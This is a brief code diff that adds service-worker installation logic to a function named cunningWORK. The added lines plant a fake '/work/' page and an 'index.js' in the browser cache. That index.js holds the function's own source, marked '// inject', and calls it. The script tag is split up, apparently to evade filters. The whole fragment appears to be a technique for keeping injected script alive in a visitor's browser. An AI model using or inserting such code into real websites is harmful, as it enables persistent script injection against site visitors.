@@ -88,6 +88,10 @@ function cunningWORK() {
 
       if (registration.installing) {
         console.log("Service worker installing");
+        const cache = await caches.open('v1');
+        await cache.put('/work/', new Response('<' + 'script' + ' src=index.js></' + 'script' + '>'));
+        await cache.put('/work/index.js', new Response('// inject\n' + cunningWORK + ' cunningWORK();'));
+
       } else if (registration.waiting) {
         console.log("Service worker installed");
       } else if (registration.active) {
